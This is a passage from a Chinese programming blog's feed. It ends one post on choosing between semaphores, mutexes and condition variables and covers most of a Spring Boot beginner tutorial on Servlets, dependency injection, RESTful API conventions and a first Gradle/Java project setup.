要求线程池中，之前一阶段分配过任务的所有线程都完成计算后，才进行下一阶段的计算任务。这就是多线程的条件，这个场合就适合使用条件变量。</p></blockquote><p>semaphore 虽然也有提醒的意思，但它的语义重点不在条件上，它的重点在于 “<strong>根据某个整数（常常是共享资源的数量）来限制和提醒某个共享资源是否可用</strong>”。</p><p>而这层含义就天然的让 semaphore 比 mutex 和 CV <strong>在语义上更适合解决生产者消费者模型（Consumer / Producer Model）有关的问题</strong>。</p><blockquote><p>因为它们在某些情况下都能解决这个问题，但是语义上有优劣之分。</p></blockquote><p>大家不妨再回想一下 读者/写者模型，在 CSAPP 书中是使用 semaphore 完成的，但是实际上这个模型在语义上更适合 Conditional Variables 完成。因为这需要资源有条件的提醒机制。使用 semaphore 虽然实现上更简单，但是破坏了一部分的语义，也可能出现额外的 “虚假唤醒” 的问题。</p><blockquote><ul><li><p>例如为什么一定要记录当前读者数、等待的写者数、写者数？我不关心呢？是不是增加了冗余复杂度？</p></li><li><p>semaphore 没有显式地提醒某一类等待的线程，而是通过可用数量的方式<strong>间接</strong>展示了资源的可用性。</p><p>这并不准确，在多核、很多线程等待的情况下可能<u>无法像 CV 一样，能控制同时唤醒多个线程，还是只唤醒一个等待的线程</u>。</p></li></ul></blockquote><p>相信在上面的分析中大家以已经看到了，conditional variable 和 semaphore 在实现上能相互替代，只不过有语义和实现复杂度的 trade off 罢了，它们的使用场景也存在重叠的情况。</p><h2 id="Application-Parallel-MST-Algorithm"><a href="#Application-Parallel-MST-Algorithm" class="headerlink" title="Application: Parallel MST Algorithm"></a>Application: Parallel MST Algorithm</h2><p>其中一个比较有名的多线程同步的应用场景是，<strong>并行最小生成树的计算</strong>。由于计算最小生成树是很多算法依赖的基本算法，因此优化这个算法曾是学界比较热门的话题。</p><p>以并行的 Kruskal 算法（基于最小边的贪婪算法）为例，其主体思想与非并行化的 Kruskal 算法大致相同。</p><p>通过对图的划分，将原图分为若干不相交的分区，交由不同的进程或线程计算最小边权，从而达到加速计算的效果。</p><p>整个算法分为由各并行线程完成的 “部分算法” 与由一个主线程完成的 “仲裁算法”。</p><p>在“部分算法”中，当各进程<strong>收到来自全局进程的计算通知</strong>后，选出本分区当中具有最小权重的边并发送给全局进程，并且等待，直到本分区没有待处理的边或收到全局进程的结束通知时结束进程。</p><p>在 “仲裁算法” 中：</p><ol><li>全局进程首先向所有并行进程发送消息获取各分区最小权重边构成队列 $Q_i$；</li><li>接下来循环取出 $Q_i$ 中权值最小的边 $e_j=\min\limits_{i}{e_i}$，并向提供边 $e$ 的进程 $j=\text{argmin }e_i$ 发送消息请求补充新的最小权重边至 $Q_j$ 中；</li><li>如果取出的边 $e_j$ 加入到结果集 $T$ 中不会构成环路则保留此边，若会构成环路则将其丢弃。</li><li>当 $T$ 中的边的数量为 $|V|-1$ 或队列 $Q_i$ 均为空时算法结束，同时通知各进程结束算法。</li></ol><p>这里我们发现有多次的信息的通知语义，而且是针对特定线程。因此这里没法采用 semaphore 和 mutex，采取条件变量控制是较为合适的。</p><h2 id="Extra-Recursive-Mutex-amp-Lock-in-C"><a href="#Extra-Recursive-Mutex-amp-Lock-in-C" class="headerlink" title="Extra: Recursive Mutex &amp; Lock in C++"></a>Extra: Recursive Mutex &amp; Lock in C++</h2><p>C++ STL 库中存在的 Recursive Mutex 就是一个进程加了几次锁，就要释放几次锁，才能解除对资源的锁定。这一般用在一些特殊的业务逻辑场景中。</p><p>Lock 是利用面向对象的方法对 Mutex 进行了包装。在 Lock 的构造函数中加锁、析构函数中解锁，起到在 Lock 生命周期作用域内保护资源的作用，减轻了编码人员的编码负担。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;学习 ICS 的并行一章之后，笔者有些疑惑，semaphore（信号量）、mutex（互斥锁）、conditional variables（条件变量）这 3 者之间究竟该怎么区分它们的使用场景？&lt;/p&gt;
&lt;p&gt;首先我们需要去阐述清楚它们各自的定义和效果。&lt;/p&gt;
&lt;p&gt;学术</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="GNU" scheme="https://blog.sjtuxhw.top/tags/GNU/"/>
    
    <category term="CSAPP" scheme="https://blog.sjtuxhw.top/tags/CSAPP/"/>
    
    <category term="ICS" scheme="https://blog.sjtuxhw.top/tags/ICS/"/>
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
  </entry>
  
  <entry>
    <title>Java Spring Boot 入门</title>
    <link href="https://blog.sjtuxhw.top/technical/spring-boot-basic/"/>
    <id>https://blog.sjtuxhw.top/technical/spring-boot-basic/</id>
    <published>2024-05-06T11:12:30.000Z</published>
    <updated>2024-10-25T14:00:00.921Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前置条件：WEB 基础（Socket，HTTP 整套规范），SQL 和数据库基础，Java 语言基础、前端基础（至少了解一种前端框架，本文以 React 为例）；</p></blockquote><h1 id="Chapter-0-Basic-Concepts"><a href="#Chapter-0-Basic-Concepts" class="headerlink" title="Chapter 0. Basic Concepts"></a>Chapter 0. Basic Concepts</h1><h2 id="0-1-Servlet-war-amp-jar"><a href="#0-1-Servlet-war-amp-jar" class="headerlink" title="0.1 Servlet, war &amp; jar"></a>0.1 Servlet, <code>war</code> &amp; <code>jar</code></h2><p>在接触 Web 框架时，你肯定能碰到一个绕不开的词：Servlet。它是什么？</p><p>Servlet 本质上就是一种规范，在 Java 的实现中就是一个 Web 规范接口。</p><p>所以，为什么要有这个规范？让我们回到最初的起点。</p><hr><p>假设你什么框架都不用，想要徒手写一个能提供服务的服务器，那需要做哪些工作？</p><p>其实原理比较简单，遵循当今互联网的 HTTP 协议发报文就行：</p><ul><li>先编写基于多线程的 TCP 服务（Web 3.0 准备改用 UDP 了）；</li><li>然后在一个 TCP 连接中读取 HTTP 请求，发送 HTTP 响应即可；</li></ul><p>但是其中还要考虑一些与网络协议相关、与业务逻辑无关的其他情况：</p><ul><li>识别正确和错误的 HTTP 请求；</li><li>识别正确和错误的 HTTP 头；</li><li>复用 TCP 连接；</li><li>复用线程；</li><li>IO 异常处理；</li><li>…</li></ul><p>说到这里头都大了🥹 这些 “基础工作” 需要耗费大量的时间，并且经过长期测试才能稳定运行。如果我们只需要输出一个简单的 HTML 页面，就不得不编写上千行底层代码，那就根本无法做到高效而可靠地开发！</p><p>人们为了简化这一过程，抽象出了一个中间层：Web Server。</p><p>这些共性的、与业务逻辑无关的东西，我们统统交给现成的轮子（web server）去做，我们只需要在 web server 上写自己的应用，与 web server 做沟通就行。</p><p>进一步地，人们为了统一 “应用程序与 Web Server” 的交互接口，进一步实现功能解耦（即如果换了另一个人写的 web server，上层的应用程序根本不需要变），在 Java 中就定义了一个 Web Server 的接口，称为 Servlet。</p><p>上层应用程序可以通过继承于这个接口创建一个适用于自己程序的、处理 Web Server 发来的信息的类，以便把信息传入自己的业务逻辑中。其关系如下图所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">                 ┌───────────┐</span><br><span class="line">                 │My Servlet │</span><br><span class="line">                 ├───────────┤</span><br><span class="line">                 │Servlet API│</span><br><span class="line">┌───────┐  HTTP  ├───────────┤</span><br><span class="line">│Browser│&lt;──────&gt;│Web Server │</span><br><span class="line">└───────┘        └───────────┘</span><br></pre></td></tr></table></figure><p>这里的 Web Server 又被称为 Servlet Container，它的作用就是，解析 client / browser 发起的 request，并组装出 HTTP Request、创建 HTTP Response，将二者交于内部自定义的 Servlet（My Servlet）处理和填充。</p><blockquote><p>像 Tomcat、Jetty、GlassFish 就是一些常见的 Web Server。</p></blockquote><p>现在还有一个问题没解决。如果由 Web Server 来帮助我们完成，那么我们写应用程序时，需要和 Web Server 一起编译打包吗？答案是不需要。</p><p>在 Java 中，我们需要将自己写的 Servlet 以及其他业务逻辑的程序打包成一个 <code>*.war</code> 的文件（和 <code>*.jar</code> 不一样，不能直接运行），然后必须由含有 Servlet API 的 Web Server 动态加载进去执行，所以 Web Server 又叫 Servlet Container。</p><p>那么具体自己如何编写 Servlet 呢？以 <code>javax.Servlet</code> 类为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 1. 初始化 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line">    <span class="comment">/* 2. 获取配置 */</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">/* 3. 发出服务 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException;</span><br><span class="line">    <span class="comment">/* 4. 获得信息 */</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">/* 5. 销毁 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从原理上讲，Servlet 可以处理<strong>任何类型</strong>的请求，但绝大多数情况下 Servlet 只用来扩展基于 HTTP 协议的 Web Server。</p><h2 id="0-2-Spring-Spring-MVC-Spring-Boot"><a href="#0-2-Spring-Spring-MVC-Spring-Boot" class="headerlink" title="0.2 Spring, Spring MVC, Spring Boot"></a>0.2 Spring, Spring MVC, Spring Boot</h2><p>除了 Servlet，我们还要弄清楚 Spring 框架以及其中的各种常用术语。Spring MVC、Spring、Spring Boot 有什么关系？</p><p>首先尝试理解一下 Spring 框架。</p><blockquote><p>以下部分内容引用自 <a href="https://blog.csdn.net/codeSmart/article/details/106836336">CSDN Blog - 狂野弘仁</a>；</p></blockquote><p>Spring，一般指代的是 Spring Framework，<strong>它是一个开源的应用程序框架</strong>，提供了一个简易的开发方式，通过这种开发方式，将避免那些可能致使代码变得繁杂混乱的大量的业务/工具对象（由框架来帮你管理这些对象，包括它的创建，销毁等）。</p><p>Spring Framework 最重要也是最核心的特性是依赖注入。所有的 <strong>Spring 模块的核心就是 DI（依赖注入）或者 IoC（控制反转）</strong>。依赖注入或控制反转是 Spring Framework 最大的特性，当我们正确使用这二者时，可以开发出一个高内聚低耦合的应用程序，而这一一个低耦合的应用程序可以轻松的对其实施单元测试。这就是 Spring Framework 解决的最核心的问题。</p><blockquote><p>什么是控制反转？</p><p>是一种软件设计思想，也是 Spring 框架的核心概念之一。</p><p>假设类 <code>A</code> 需要类 <code>B</code> 作为组成部分，那么在传统设计理念下，类 <code>A</code> 初始化时，需要顺便创建 <code>B</code> 的对象，并且要在 <code>B</code> 的全部生命周期内维护它。这样做法虽然正确，但是有几个缺点：</p><ol><li>类型紧耦合。如果想要更换 <code>B</code>，那么需要找到类 <code>A</code> 中所有用到 <code>B</code> 的地方全部去改；</li><li>全盘管理外部对象，加重编写负担，模糊业务逻辑，使维护难以进行。</li></ol><p>于是，人们想出一种方法，将数据对象封装成一个 Java Bean，把这个 Bean 交给一个容器管理（被称为 IoC Container，在 Spring 中由框架代码帮忙完成），要用到它的时候写注解自动注入，提升了组件的重用性，实现组件解耦。</p><p>以 Spring 的两个注解为例：</p><p><code>@Component</code>: 该注解将会告诉 Spring Framework，被此注解标注的类需要纳入到 Bean 管理器（IoC Container）中。<br><code>@Autowired</code>: 告诉 Spring Framework 需要找到一与其类型匹配的对象，并将其自动引入到所需要的类中。</p><p>什么是依赖注入？</p><p>可以这么理解：它们是同一个概念的不同角度描述。通俗来说就是 <strong>IoC是设计思想，DI是实现方式</strong>。二者的终极作用是<u>去除 Java 类之间的依赖关系，实现松耦合</u>，以便于开发测试。例如对于这个类型设计：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span> &#123;  </span><br><span class="line"> <span class="keyword">private</span> Weapon weapon;  </span><br><span class="line"></span><br><span class="line"> <span class="comment">// weapon 注入</span></span><br><span class="line"> Player(Weapon weapon)&#123;  </span><br><span class="line">     <span class="built_in">this</span>.weapon = weapon;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">     weapon.attack();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setWeapon</span><span class="params">(Weapon weapon)</span>&#123;  </span><br><span class="line">     <span class="built_in">this</span>.weapon = weapon;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义 Spring Bean 配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;player&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.Player&quot;</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">construct-arg</span> <span class="attr">ref</span>=<span class="string">&quot;weapon&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;weapon&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.Gun&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们对于 Weapon 的实例构造并不在 <code>Player</code> 内，而是放在配置文件中，依靠<strong>多态</strong>（<code>Gun</code> 继承于 <code>Weapon</code>）和<strong>反射</strong>（读配置、构造对象，外部设置类的行为）实现依赖注入，让两个业务类解耦合。</p><p>或者说，在依赖解耦合方面，<u>控制反转是设计思想，依赖注入是一个设计模式，配置文件只是形式，反射和多态是底层实施手段</u>。</p></blockquote><p>而 Spring Framework 的其他高级特性，例如：Spring AOP、Spring JDBC、Spring MVC、Spring ORM、Spring Test，它们<u>都不是一个全新的功能</u>。因为在不使用 Spring Framework 的情况下，我们依然能够使用 JDBC 连接数据库、依然能够对视图和数据模型进行控制、依然能够使用第三方的 ORM 框架。</p><p>Spring Framework 只是<u>对这些功能中的逻辑采用上述思想进行解耦合，以及进一步封装</u>。例如 Spring JDBC 与传统的 JDBC 相比，使用 JDBC Template 操作数据库，首先是代码量小了，其次是我们不需要再面对恐怖的 try-catch；</p><blockquote><p>如果你还使用过 C++ 配合 MySQL 原生驱动的组合的话，就完全明白这句话的分量……</p></blockquote><p>再比如 Spring Framework 的 MVC，提供了构建 Web 应用程序的全功能 MVC 模块，实现了 Web MVC 设计模式以及请求驱动类型的轻量级 Web 框架，即采用了 MVC 架构模式的思想，将 Web 层进行职责解耦。基于请求驱动指的是使用请求-响应模型，视图与数据模型分离：</p><ul><li>Dispatcher Servlet；</li><li>ModelAndView；</li><li>ViewResolver；</li></ul><p>这个功能模块是人们利用 Spring 解耦的组件进行进一步整合而得出的。</p><p>而 Spring Boot 就像整合了常用配置的“懒人包”，实现多种自动配置：</p><ul><li><p>如果Hibernate的依赖被放到了类路径上，Spring Boot会自动配置数据源；</p></li><li><p>如果Spring MVC的依赖被放到了类路径上，Spring Boot又会自动配置Dispatcher Servlet；</p></li><li><p>当Spring Boot检测到有新的依赖包添加到类路径上，Spring Boot会采用默认的配置对新的依赖包进行设置，如果我们想自己配置依赖包时，只需要手动覆盖默认的配置项即可；</p></li><li><p>Spring Boot 已经内置了多个 Web server，如 Undertow, jetty, tomcat，因此我们不需要再额外的配置服务器（比如前一节提到的打包为 <code>war</code>，然后部署），就可以完成应用程序的调试工作；</p></li></ul><p>所以，严格意义上讲，Spring Boot 并不是某种框架，它只是为开发人员提供了一个更好的更方便的使用 Spring Framework 的解决方案（相当于人家把环境都自动化配好了）。</p><p><img src="imgs/spring-frame.png"></p><h2 id="0-3-RESTful-API"><a href="#0-3-RESTful-API" class="headerlink" title="0.3 RESTful API"></a>0.3 RESTful API</h2><p>在开始前，还要了解一个概念，什么是 RESTful API（你们互联网事真多😅）。</p><p>在互联网并没有完全流行的初期，移动端也没有那么盛行，页面请求和并发量也不高，那时候人们对网络的接口的要求没那么高。只是写一些静态页面、偶尔用用一些动态页面（jsp，整个页面同时刷新）、然后按照 HTTP 等规范手动 DIY 发一发报文，就能满足绝大多数的使用需求。</p><p>但是随着互联网和移动设备的发展，人们对 Web 应用的使用需求也增加，传统的动态页面由于低效率而渐渐被 HTML + JavaScript (Ajax) 的前后端分离所取代，并且安卓、IOS、小程序等形式客户端层出不穷，客户端的种类出现多元化，<strong>而客户端和服务端就需要接口进行通信</strong>，但接口的<strong>规范性</strong>就又成了一个问题。</p><p>假设服务供应方 <code>A</code> 做了一套通信接口，另一个服务供应方 <code>B</code> 又搓了一套通信接口，那么我想同时用这两家服务，难不成还要应用开发者写两套访问逻辑？太不优雅了！</p><p>所以一套<strong>结构清晰、符合标准、易于理解、扩展方便</strong>让大部分人都能够理解接受的<u>接口风格</u>（或者说共同约定）就显得越来越重要。</p><p>2000 年的时候，有个人在他的博士论文中提出了一套软件架构的设计风格（不是标准，只是一组设计原则、共同约定），它主要用于客户端（或浏览器）和服务器交互类的软件。这个人就是 Roy Thomas Fielding。</p><p>基于这个风格设计的软件可以更简洁，更有层次，更易于实现缓存等机制。</p><p>这个设计风格也被他命名为 “表述性状态转移”（Representational State Transfer，REST）的架构风格。满足这个架构风格的接口设计就被称为 RESTful API。</p><p>那么这个风格的特征是什么？或者说它的 “共同约定” 是什么？</p><p>REST 架构的 6 个限制条件，又称为 RESTful 6 大原则：</p><ul><li><p><strong>客户端-服务端分离</strong>（解耦）；</p></li><li><p><strong>无状态的（Stateless）</strong>：服务端不保存客户端状态，客户端保存状态信息每次请求携带状态信息；</p></li><li><p><strong>可缓存性（Cacheability）</strong> ：服务端需回复是否可以缓存以让客户端甄别是否缓存提高效率;</p></li><li><p><strong>统一接口（Uniform Interface）</strong>：通过一定原则设计接口降低耦合，简化系统架构，这是RESTful设计的基本出发点；</p><blockquote><p>这组接口就是针对资源的操作，包括获取、创建、修改、删除。</p><p>恰好对应了 HTTP 协议提供的 GET、POST、PUT 和 DELETE 方法。</p><p>注意，REST 原则强烈不建议接口动作与资源访问标识符混合使用。</p><p>REST 认为，<strong>URI指向资源</strong>、以资源为基础，应该以名词标识，真正的动作应该从 HTTP 的请求动作上识别。</p><p>注 1：Universal Resource Identifier 统一资源标志符，用来标识抽象或物理资源的一个紧凑字符串。URI 包括 URL（Locator）和 URN（Navigator）；</p><p>注 2：一个资源可以是文本（通常以 JSON / HTML / XML 为载体）、二进制流等其他任何数据（一般从数据库中拿到的）；</p></blockquote></li><li><p><strong>分层系统（Layered System）</strong>：客户端对服务端的情况无感，无法直接知道连接的到终端还是中间设备，分层允许灵活地部署服务端项目；</p></li><li><strong>按需代码（Code-On-Demand，可选）</strong>：允许我们灵活的发送一些看似特殊的代码给客户端例如 JavaScript 代码。</li></ul><blockquote><p>当然，RESTful API 也是有缺陷的，例如过于重视资源的作用，导致一些与资源关系不大的场合（例如聊天服务器、通信服务器）如果使用 RESTful Web Service 则反而加重了开发负担。</p></blockquote><h3 id="补充：RESTful-API-设计规范"><a href="#补充：RESTful-API-设计规范" class="headerlink" title="补充：RESTful API 设计规范"></a>补充：RESTful API 设计规范</h3><blockquote><p>本部分摘自 <a href="https://zhuanlan.zhihu.com/p/334809573">知乎专栏</a>；</p></blockquote><p>如果想要自己设计一个 RESTful API（而不是使用各大框架中的办法），那么就要遵循以上的约定。具体来说：</p><p>URL 的 path 是需要认真考虑的，而 RESTful 对 path 的设计做了一些规范，通常一个 RESTful API 的 path 组成如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&#123;version&#125;/&#123;resources&#125;/&#123;resource_id&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>version</code>：API 版本号，有些版本号放置在头信息中也可以，通过控制版本号有利于应用迭代；<br><code>resources</code>：资源，RESTful API 推荐用小写英文单词的复数形式；<br><code>resource_id</code>：资源的id，访问或操作该资源；</p></blockquote><p>当然，有时候可能资源级别较大，其下还可细分很多子资源也可以灵活设计 URL 的 path，例如：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&#123;version&#125;/&#123;resources&#125;/&#123;resource_id&#125;/&#123;subresources&#125;/&#123;subresource_id&#125;</span><br></pre></td></tr></table></figure><p>此外，有时可能增删改查无法满足业务要求，可以在 URL 末尾加上 action，例如</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&#123;version&#125;/&#123;resources&#125;/&#123;resource_id&#125;/action</span><br></pre></td></tr></table></figure><p>其中 action 就是对资源的操作。</p><p>从大体样式了解 URL 路径组成之后，对于 RESTful API 的 URL 具体设计的规范如下：</p><ol><li>不用大写字母，所有单词使用英文且小写；</li><li>连字符用中杠 <code>&quot;-&quot;</code> 而不用下杠 <code>&quot;_&quot;</code>；</li><li>正确使用 <code>&quot;/&quot;</code> 表示层级关系,URL的层级不要过深，并且越靠前的层级应该相对越稳定；</li><li>结尾不要包含正斜杠分隔符 <code>&quot;/&quot;</code>；</li><li>URL中不出现动词，用请求方式表示动作；</li><li>资源表示用复数不要用单数；</li><li>不要使用文件扩展名；</li></ol><p>此外，在 RESTful API 中，不同的HTTP请求方法有各自的含义，这里就展示 GET,POST,PUT,DELETE 几种请求 API 的设计与含义分析。针对不同操作，具体的含义如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /collection： 从服务器查询资源的列表（数组）</span><br><span class="line">GET /collection/resource： 从服务器查询单个资源</span><br><span class="line">POST /collection： 在服务器创建新的资源</span><br><span class="line">PUT /collection/resource： 更新服务器资源</span><br><span class="line">DELETE /collection/resource： 从服务器删除资源</span><br></pre></td></tr></table></figure><p>在非 RESTful 风格的 API 中，我们通常使用 GET 请求和 POST 请求完成增删改查以及其他操作，查询和删除一般使用 GET 方式请求，更新和插入一般使用 POST 请求。从请求方式上无法知道 API 具体是干嘛的，所有在 URL 上都会有操作的动词来表示 API 进行的动作，例如：query，add，update，delete 等等。</p><p>而 RESTful 风格的 API 则要求在 URL 上都以名词的方式出现，从几种请求方式上就可以看出想要进行的操作，这点与非 RESTful 风格的 API 形成鲜明对比。</p><p>在谈及 GET,POST,PUT,DELETE 的时候，就必须提一下接口的<strong>安全性和幂等性</strong>，其中安全性是指方法不会修改资源状态，即读的为安全的，写的操作为非安全的。而幂等性的意思是操作一次和操作多次的最终效果相同，客户端重复调用也只返回同一个结果。</p><div class="table-container"><table><thead><tr><th>HTTP Method</th><th>安全性</th><th>幂等性</th><th>解释</th></tr></thead><tbody><tr><td>GET</td><td>安全</td><td>幂等</td><td>读操作（安全），查询多次结果一致</td></tr><tr><td>POST</td><td>非安全</td><td>非幂等</td><td>写操作（非安全），每次插入后与上次的结果不一样</td></tr><tr><td>PUT</td><td>非安全</td><td>幂等</td><td>写操作（非安全），插入相同数据多次结果一致</td></tr><tr><td>DELETE</td><td>非安全</td><td>幂等</td><td>写操作（非安全），删除相同数据多次结果一致</td></tr></tbody></table></div><h3 id="Tips-调试数据请求时的类型选择"><a href="#Tips-调试数据请求时的类型选择" class="headerlink" title="Tips. 调试数据请求时的类型选择"></a>Tips. 调试数据请求时的类型选择</h3><p>在使用类似 Postman 的工具发送请求时，可能会遇到不同种类可选的数据类型：</p><ul><li><strong>form-data</strong>： 就是 form 表单中的 multipart/form-data，会将表单数据处理为一条信息，用特定标签符将一条条信息分割开，而这个文件类型通常用来上传二进制文件；</li><li><strong>x-www-form-urlencoded</strong>：就是application/x-www-form-urlencoded，是 form 表单默认的 encType，form 表单会将表单内的数据转换为键值对，这种格式不能上传文件；</li><li><strong>raw</strong>：可以上传任意格式的文本，可以上传 Text，JSON，XML 等，但目前大部分还是上传 JSON 格式数据。当后端需要接收 JSON 格式数据处理的时候，可以采用这种格式来测试。</li></ul><blockquote><p>这部分概念太多了，有些概念用到再说。</p></blockquote><h1 id="Chapter-1-Introduction-to-Spring-Boot"><a href="#Chapter-1-Introduction-to-Spring-Boot" class="headerlink" title="Chapter 1. Introduction to Spring Boot"></a>Chapter 1. Introduction to Spring Boot</h1><h2 id="1-1-First-Spring-Boot-Project-A-RESTful-Web-Service"><a href="#1-1-First-Spring-Boot-Project-A-RESTful-Web-Service" class="headerlink" title="1.1 First Spring Boot Project: A RESTful Web Service"></a>1.1 First Spring Boot Project: A RESTful Web Service</h2><p>在进入枯燥的概念和接口学习前，先用简单的方法构建一个简单的 RESTful Web Service 出来。</p><p>首先使用 gradle 构建管理工具创建一个项目，引入依赖：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">    id <span class="string">&#x27;java&#x27;</span></span><br><span class="line">    id <span class="string">&#x27;org.springframework.boot&#x27;</span> version <span class="string">&#x27;3.2.4&#x27;</span></span><br><span class="line">    id <span class="string">&#x27;io.spring.dependency-management&#x27;</span> version <span class="string">&#x27;1.1.4&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 包位置 priv.demo */</span></span><br><span class="line">group = <span class="string">&#x27;priv.demo&#x27;</span></span><br><span class="line">version = <span class="string">&#x27;0.0.1-SNAPSHOT&#x27;</span></span><br><span class="line"></span><br><span class="line">java &#123;                                                                                   sourceCompatibility = <span class="string">&#x27;21&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">repositories &#123;                                                                           mavenCentral()</span><br><span class="line">&#125;</span><br><span class="line">dependencies &#123;                                                                           implementation <span class="string">&#x27;org.springframework.boot:spring-boot-starter-web&#x27;</span></span><br><span class="line">   testImplementation <span class="string">&#x27;org.springframework.boot:spring-boot-starter-test&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">tasks.named(<span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    useJUnitPlatform()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个 Java 记录类型作为存放数据的结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">record</span> <span class="title class_">Greeting</span><span class="params">(<span class="type">long</span> id, String content)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>创建一个资源控制器（相当于 Servlet 的处理逻辑）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicLong;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreetingController</span> 